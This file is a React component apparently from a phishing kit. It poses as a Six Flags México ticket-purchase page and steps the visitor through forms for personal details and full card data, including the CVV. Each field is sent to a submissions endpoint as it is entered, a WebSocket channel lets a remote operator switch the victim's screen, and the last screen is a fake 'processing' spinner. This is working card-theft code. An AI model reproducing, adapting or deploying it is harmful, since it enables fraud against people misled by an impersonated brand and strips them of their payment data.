import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";
import sixflagsLogo from "@/assets/coasterlogo.png";
import seasonPass from "@/assets/season_hauntedpass_esmx.jpg";

export default function TemplateSixFlags() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  
  const [currentScreen, setCurrentScreen] = useState("landing");
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    ticketType: "",
    quantity: "",
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    nameOnCard: "",
  });

  // Update session when screen changes
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  // Submit data mutation
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const submitData = async (fieldName: string, fieldValue: string) => {
    await submitDataMutation.mutateAsync({ fieldName, fieldValue });
  };

  // Listen for WebSocket updates to change screen remotely
  useEffect(() => {
    if (lastMessage) {
      try {
        const message = JSON.parse(lastMessage);
        if (message.type === 'session_updated' && 
            message.data.id === sessionId && 
            message.data.currentScreen && 
            message.data.currentScreen !== currentScreen) {
          setCurrentScreen(message.data.currentScreen);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    }
  }, [lastMessage, sessionId, currentScreen]);

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
  };

  const handleTicketSelect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.ticketType || !formData.quantity) return;

    await submitData("ticket_type", formData.ticketType);
    await submitData("quantity", formData.quantity);

    setTimeout(async () => {
      setCurrentScreen("personal");
      await updateSession({ currentScreen: "personal", status: "active" });
    }, 1500);
  };

  const handlePersonalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.firstName || !formData.lastName || !formData.email || !formData.phone) return;

    await submitData("first_name", formData.firstName);
    await submitData("last_name", formData.lastName);
    await submitData("email", formData.email);
    await submitData("phone", formData.phone);

    setTimeout(async () => {
      setCurrentScreen("payment");
      await updateSession({ currentScreen: "payment", status: "active" });
    }, 1500);
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.cardNumber || !formData.expiryDate || !formData.cvv || !formData.nameOnCard) return;

    await submitData("card_number", formData.cardNumber);
    await submitData("expiry_date", formData.expiryDate);
    await submitData("cvv", formData.cvv);
    await submitData("name_on_card", formData.nameOnCard);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading", status: "completed" });
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "landing":
        return (
          <div className="min-h-screen bg-gradient-to-b from-orange-600 via-red-600 to-purple-700 relative overflow-hidden">
            {/* Background pattern */}
            <div className="absolute inset-0 opacity-10">
              <div className="absolute top-0 left-0 w-full h-full" 
                   style={{
                     backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.1'%3E%3Ccircle cx='30' cy='30' r='4'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
                   }}>
              </div>
            </div>

            {/* Header */}
            <header className="relative z-10 flex items-center justify-between p-6 max-w-7xl mx-auto">
              <div className="flex items-center">
                <img src={sixflagsLogo} alt="Six Flags" className="h-12 w-auto" />
                <span className="ml-3 text-2xl font-bold text-white">Six Flags México</span>
              </div>
              <nav className="hidden md:flex space-x-6">
                <a href="#" className="text-white hover:text-yellow-300">Boletos</a>
                <a href="#" className="text-white hover:text-yellow-300">Pases</a>
                <a href="#" className="text-white hover:text-yellow-300">Atracciones</a>
                <a href="#" className="text-white hover:text-yellow-300">Eventos</a>
              </nav>
            </header>

            {/* Hero Section */}
            <main className="relative z-10 flex flex-col items-center justify-center text-center px-6 py-20">
              <h1 className="text-6xl md:text-8xl font-black text-white mb-6">
                ¡COMPRA TUS
                <br />
                <span className="text-yellow-400">BOLETOS!</span>
              </h1>
              
              <p className="text-xl md:text-2xl text-white mb-8 max-w-2xl">
                Vive la experiencia más emocionante en el parque de diversiones 
                más grande de México
              </p>

              <div className="bg-white/90 backdrop-blur-sm rounded-lg p-8 max-w-md w-full shadow-2xl">
                <h2 className="text-2xl font-bold text-gray-800 mb-6">Comprar Boletos</h2>
                <form onSubmit={handleTicketSelect} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Tipo de Boleto
                    </label>
                    <select
                      value={formData.ticketType}
                      onChange={(e) => handleInputChange("ticketType", e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white"
                      required
                    >
                      <option value="">Selecciona un boleto</option>
                      <option value="general">Boleto General - $599</option>
                      <option value="express">Boleto Express - $899</option>
                      <option value="vip">Boleto VIP - $1299</option>
                      <option value="season">Pase de Temporada - $1999</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Cantidad
                    </label>
                    <select
                      value={formData.quantity}
                      onChange={(e) => handleInputChange("quantity", e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white"
                      required
                    >
                      <option value="">Cantidad</option>
                      <option value="1">1 boleto</option>
                      <option value="2">2 boletos</option>
                      <option value="3">3 boletos</option>
                      <option value="4">4 boletos</option>
                      <option value="5">5+ boletos</option>
                    </select>
                  </div>

                  <button
                    type="submit"
                    className="w-full bg-gradient-to-r from-orange-500 to-red-600 text-white py-3 px-6 rounded-lg font-bold text-lg hover:from-orange-600 hover:to-red-700 transition-all duration-300 transform hover:scale-105"
                  >
                    Continuar
                  </button>
                </form>
              </div>

              {/* Season Pass Promotion */}
              <div className="mt-12">
                <img src={seasonPass} alt="Season Pass" className="max-w-xs mx-auto rounded-lg shadow-lg" />
              </div>
            </main>
          </div>
        );

      case "personal":
        return (
          <div className="min-h-screen bg-gray-50 py-12">
            <div className="max-w-lg mx-auto bg-white rounded-lg shadow-lg p-8">
              <div className="text-center mb-8">
                <img src={sixflagsLogo} alt="Six Flags" className="h-16 mx-auto mb-4" />
                <h1 className="text-2xl font-bold text-gray-800">Información Personal</h1>
                <p className="text-gray-600">Completa tus datos para continuar</p>
              </div>

              <form onSubmit={handlePersonalSubmit} className="space-y-6">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nombre
                    </label>
                    <input
                      type="text"
                      value={formData.firstName}
                      onChange={(e) => handleInputChange("firstName", e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                      placeholder="Tu nombre"
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Apellido
                    </label>
                    <input
                      type="text"
                      value={formData.lastName}
                      onChange={(e) => handleInputChange("lastName", e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                      placeholder="Tu apellido"
                      required
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Correo Electrónico
                  </label>
                  <input
                    type="email"
                    value={formData.email}
                    onChange={(e) => handleInputChange("email", e.target.value)}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                    placeholder="tu@email.com"
                    required
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Teléfono
                  </label>
                  <input
                    type="tel"
                    value={formData.phone}
                    onChange={(e) => handleInputChange("phone", e.target.value)}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                    placeholder="55 1234 5678"
                    required
                  />
                </div>

                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-orange-500 to-red-600 text-white py-3 px-6 rounded-lg font-bold text-lg hover:from-orange-600 hover:to-red-700 transition-all duration-300"
                >
                  Continuar al Pago
                </button>
              </form>
            </div>
          </div>
        );

      case "payment":
        return (
          <div className="min-h-screen bg-gray-50 py-12">
            <div className="max-w-lg mx-auto bg-white rounded-lg shadow-lg p-8">
              <div className="text-center mb-8">
                <img src={sixflagsLogo} alt="Six Flags" className="h-16 mx-auto mb-4" />
                <h1 className="text-2xl font-bold text-gray-800">Método de Pago</h1>
                <p className="text-gray-600">Información de tu tarjeta</p>
              </div>

              <form onSubmit={handlePaymentSubmit} className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Número de Tarjeta
                  </label>
                  <input
                    type="text"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    required
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Fecha de Vencimiento
                    </label>
                    <input
                      type="text"
                      value={formData.expiryDate}
                      onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                      placeholder="MM/YY"
                      maxLength={5}
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      CVV
                    </label>
                    <input
                      type="text"
                      value={formData.cvv}
                      onChange={(e) => handleInputChange("cvv", e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                      placeholder="123"
                      maxLength={4}
                      required
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Nombre en la Tarjeta
                  </label>
                  <input
                    type="text"
                    value={formData.nameOnCard}
                    onChange={(e) => handleInputChange("nameOnCard", e.target.value)}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-gray-800 bg-white placeholder-gray-500"
                    placeholder="Como aparece en tu tarjeta"
                    required
                  />
                </div>

                <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
                  <h3 className="font-medium text-gray-800 mb-2">Resumen de Compra</h3>
                  <div className="flex justify-between text-sm text-gray-600">
                    <span>Boleto: {formData.ticketType}</span>
                    <span>Cantidad: {formData.quantity}</span>
                  </div>
                </div>

                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-orange-500 to-red-600 text-white py-3 px-6 rounded-lg font-bold text-lg hover:from-orange-600 hover:to-red-700 transition-all duration-300"
                >
                  Finalizar Compra
                </button>
              </form>
            </div>
          </div>
        );

      case "loading":
        return (
          <div className="min-h-screen bg-gradient-to-b from-orange-600 via-red-600 to-purple-700 flex items-center justify-center">
            <div className="text-center">
              <img src={sixflagsLogo} alt="Six Flags" className="h-24 mx-auto mb-8 animate-pulse" />
              
              <div className="relative">
                <div className="w-16 h-16 mx-auto mb-6">
                  <div className="absolute top-0 left-0 w-full h-full border-4 border-white/30 rounded-full"></div>
                  <div className="absolute top-0 left-0 w-full h-full border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                </div>
              </div>

              <h2 className="text-3xl font-bold text-white mb-4">
                Procesando tu compra...
              </h2>
              <p className="text-xl text-white/80 mb-8">
                Estamos preparando tus boletos
              </p>
              
              <div className="max-w-md mx-auto">
                <div className="bg-white/10 rounded-full h-2 mb-4">
                  <div className="bg-yellow-400 h-2 rounded-full animate-pulse" style={{ width: '75%' }}></div>
                </div>
                <p className="text-white/70">
                  Por favor no cierres esta ventana...
                </p>
              </div>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return renderScreen();
}